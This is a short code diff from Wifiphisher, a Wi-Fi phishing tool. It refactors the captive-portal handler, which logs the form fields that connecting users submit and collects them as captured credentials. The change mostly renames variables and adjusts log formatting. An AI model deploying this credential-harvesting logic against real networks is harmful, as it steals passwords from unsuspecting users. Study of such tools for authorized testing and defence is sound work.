@@ -32,7 +32,7 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
                     log_file.write('[' + R + '!' + W + '] ' + R + 
                         "Wifiphisher was unable to answer the request from " + T +
                                self.request.remote_ip + R + " for " + W + self.request.full_url() +
-                               R + " (scenario is missing index.html)\n")
+                               R + " (scenario is missing index.html)" + W + "\n")
             else:
                 if os.path.exists(template.get_path() + client_request):
                     self.render(client_request, **template.get_context())
@@ -52,20 +52,20 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
             pass
 
     def post(self, url):
-        formData = self.request.body.split('&')
-        formValues = []
-        for i in formData:
-            formValues.append(i.split('='))
-        for inputName,inputValue in formValues:
+        form_data = self.request.body.split('&')
+        form_values = []
+        for this_form_data in form_data:
+            form_values.append(this_form_data.split('='))
+        for input_name,input_value in form_values:
             with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
-                log_file.write('[' + T + '*' + W + '] ' + O + "POST" + W + " request from " + T + 
-                               self.request.remote_ip + W + " input[" + G + inputName + W + 
-                               "] = " + R + inputValue + W + 
+                log_file.write('[' + T + '*' + W + '] ' + O + "POST" + W + " request from " + T +
+                               self.request.remote_ip + G + input_name + W + 
+                               " : " + R + input_value + W + 
                                "\n")
                 log_file.close()
         global terminate, creds
-        for i,x in formValues:
-            creds.insert(0, repr(i + " = " + x))
+        for input_name,input_value in form_values:
+            creds.insert(0, repr(input_name + " = " + input_value))
         terminate = True
 
         
